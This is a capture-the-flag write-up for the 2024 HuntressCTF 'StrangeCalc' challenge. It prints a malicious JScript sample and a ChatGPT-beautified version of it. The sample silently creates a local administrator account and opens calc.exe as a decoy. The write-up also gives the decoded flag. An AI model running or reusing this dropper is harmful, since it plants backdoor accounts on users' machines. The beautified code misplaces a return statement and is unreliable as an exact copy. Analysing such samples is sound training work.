---
title: 2024 HuntressCTF - StrangeCalc
date: 2024-10-01T07:00:00-07:00
tags:
  - 
image: /2024-HuntressCTF/strangecalc.png
---

### Summary
```

```

### Steps



```js
type u2POGqu61l.js
function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);
```

Using ChatGPT, I prompted it to beautify the code giving me a result of:
```js
function decode(input) {
    var result = "";
    var lines = input.split("\n");

    for (var i = 0; i < lines.length; i++) {
        var line = lines[i].replace(/^\s+|\s+$/g, '');

        // Skip lines that start with "begin", "end" or are empty
        if (line.indexOf("begin") === 0 || line.indexOf("end") === 0 || line === "") {
            continue;
        }

        var length = (line.charCodeAt(0) - 32) & 63;

        for (var j = 1; j < line.length; j += 4) {
            if (j + 3 >= line.length) break;

            var char1 = (line.charCodeAt(j) - 32) & 63;
            var char2 = (line.charCodeAt(j + 1) - 32) & 63;
            var char3 = (line.charCodeAt(j + 2) - 32) & 63;
            var char4 = (line.charCodeAt(j + 3) - 32) & 63;

            result += String.fromCharCode((char1 << 2) | (char2 >> 4));

            if (j + 2 < line.length - 1) {
                result += String.fromCharCode(((char2 & 15) << 4) | (char3 >> 2));
            }

            if (j + 3 < line.length - 1) {
                result += String.fromCharCode(((char3 & 3) << 6) | char4);
            }
        }

        return result.substring(0, length);
    }
}

var encodedString = "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
var decodedString = decode(encodedString);

var commands = [
    "net user LocalAdministrator " + decodedString + " /add",
    "net localgroup administrators LocalAdministrator /add",
    "calc.exe"
];

var shell = new ActiveXObject('WScript.Shell');

for (var i = 0; i < commands.length - 1; i++) {
    shell.Run(commands[i], 0, false);
}

shell.Run(commands[2], 1, false);
```

Here we see there is a custom decoding function that will place the variable in the password portion of the net user command. Contiuning to use ChatGPT, I prompted it to decode the password with a result `net user LocalAdministrator flag{9922fb21aaf1757e3fdb28d7890a5d93} /add`.

Flag: flag{9922fb21aaf1757e3fdb28d7890a5d93}

